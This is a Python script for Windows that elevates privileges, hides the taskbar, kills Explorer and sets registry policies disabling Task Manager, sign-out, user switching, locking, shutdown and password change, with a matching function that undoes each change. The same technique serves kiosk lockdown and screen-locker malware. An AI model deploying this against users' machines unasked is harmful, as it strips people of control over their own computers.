import ctypes
import subprocess
import winreg as reg
import sys
import time
import elevate

# Elevate privileges
elevate.elevate()

def disable():
    # Get handle to the taskbar
    taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)

    # Disable the taskbar
    ctypes.windll.user32.ShowWindow(taskbar, 0)
    
    subprocess.call("taskkill /f /im explorer.exe", shell=True)
    
    try:
        # Disable Task Manager
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
    except FileNotFoundError:
        reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    
    reg.SetValueEx(reg_key, "DisableTaskMgr", 0, reg.REG_DWORD, 1)
    reg.CloseKey(reg_key)

    # Disable Switch User
    try:
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
    except FileNotFoundError:
        reg_key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    
    reg.SetValueEx(reg_key, "HideFastUserSwitching", 0, reg.REG_DWORD, 1)
    reg.CloseKey(reg_key)

    # Disable Logoff (Sign out)
    try:
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
    except FileNotFoundError:
        reg_key = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    
    reg.SetValueEx(reg_key, "HideLogoff", 0, reg.REG_DWORD, 1)
    reg.CloseKey(reg_key)

    # Disable Lock Workstation
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
    except FileNotFoundError:
        reg_key = reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
    
    reg.SetValueEx(reg_key, "DisableLockWorkstation", 0, reg.REG_DWORD, 1)
    reg.CloseKey(reg_key)

    # Disable Shutdown
    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "NoClose", 0, reg.REG_DWORD, 1)
    reg.CloseKey(reg_key)

    # Disable Change Password
    reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
    reg.SetValueEx(reg_key, "DisableChangePassword", 0, reg.REG_DWORD, 1)
    reg.CloseKey(reg_key)


def enable():
    # Get handle to the taskbar
    taskbar = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)

    # Enable the taskbar
    ctypes.windll.user32.ShowWindow(taskbar, 1)
    subprocess.call("start explorer.exe", shell=True)
    
     # Enable Task Manager
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, "DisableTaskMgr")
        reg.CloseKey(reg_key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed to enable Task Manager: {e}")

    # Enable Switch User
    try:
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, "HideFastUserSwitching")
        reg.CloseKey(reg_key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed to enable Switch User: {e}")

    # Enable Logoff (Sign out)
    try:
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, "HideLogoff")
        reg.CloseKey(reg_key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed to enable Logoff: {e}")

    # Enable Lock Workstation
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, "DisableLockWorkstation")
        reg.CloseKey(reg_key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed to enable Lock Workstation: {e}")

    # Enable Shutdown
    try:
        reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, "NoClose")
        reg.CloseKey(reg_key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed to enable Shutdown: {e}")

    # Enable Change Password
    try:
        reg_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, reg.KEY_SET_VALUE)
        reg.DeleteValue(reg_key, "DisableChangePassword")
        reg.CloseKey(reg_key)
    except FileNotFoundError:
        pass
    except Exception as e:
        print(f"Failed to enable Change Password: {e}")


# disable()
# time.sleep(10)
# enable()
